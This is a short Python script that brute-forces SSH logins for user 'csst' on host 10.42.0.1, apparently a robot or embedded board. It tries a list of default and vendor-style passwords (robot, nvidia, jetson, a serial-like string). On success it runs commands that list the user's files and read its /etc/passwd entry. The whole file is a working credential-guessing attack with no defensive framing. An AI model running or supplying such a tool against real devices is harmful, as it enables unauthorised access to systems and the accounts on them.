import time

import paramiko

HOST = "10.42.0.1"
USER = "csst"

passwords = [
    "robot", "robot123", "Robot123",
    "ciot", "ciot123", "Ciot@123",
    "yutong", "YuTong123",
    "tyjc", "tyjc123",
    "linaro", "linaro123",
    "ubuntu", "ubuntu123",
    "nvidia", "jetson",
    "TY1251D", "ty1251d", "TY1251D03195",
    "03195", "1251", "TY1251",
    "ltme", "ltme123",
    "password", "pass123",
    "123456", "1234567",
    "123456789", "12345678",
]

print(f"Test SSH {USER}@{HOST}\n")
for pwd in passwords:
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(HOST, 22, username=USER,
                      password=pwd, timeout=5,
                      look_for_keys=False,
                      allow_agent=False)
        print(f"\n[TROUVE !!!] csst:{pwd}")
        stdin, stdout, stderr = client.exec_command(
            "whoami && cat /etc/passwd | grep csst && ls /home/csst/")
        print(stdout.read().decode())
        client.close()
        break
    except paramiko.AuthenticationException:
        print(f"[FAIL] {pwd}")
    except Exception as e:
        print(f"[ERR] {e}")
    time.sleep(1.5)
